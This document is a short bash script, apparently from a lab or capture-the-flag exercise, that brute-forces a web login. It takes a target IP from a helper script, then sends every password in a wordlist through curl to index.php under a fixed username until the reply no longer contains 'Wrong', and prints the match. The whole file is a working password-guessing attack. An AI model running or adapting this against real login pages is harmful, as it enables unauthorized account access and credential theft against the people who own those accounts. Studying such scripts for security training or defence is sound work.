ipAddr=$(bash findWebsite.bash | cut -d " " -f 7)

while read -r password
do
	if [[ $(curl -s $ipAddr"/index.php?username=furkan.paligu&password="$password | grep -c "Wrong") -eq 0 ]]; then
		echo The password is: $password
		break
	fi

done < passwords.txt
